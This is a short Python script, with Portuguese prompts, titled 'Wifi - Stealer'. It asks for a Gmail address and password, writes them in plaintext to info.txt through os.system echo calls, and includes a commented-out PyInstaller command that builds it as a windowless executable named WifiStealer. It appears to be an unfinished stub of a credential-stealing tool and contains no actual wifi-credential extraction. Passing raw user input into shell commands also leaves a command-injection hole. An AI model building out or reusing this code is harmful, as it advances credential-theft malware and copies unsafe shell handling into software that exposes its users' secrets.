import os

os.system('cls')
print("Wifi - Stealer")

print("use um G-Mail ...\n\n\n ")

email = input('Digite seu email: ')
senha = input('Digite sua Senha :')

os.system('echo Email: {} >> info.txt'.format(email))
os.system('echo Senha: {} >> info.txt'.format(senha))


#os.system('pyinstaller main.py -w -F -n WifiStealer')
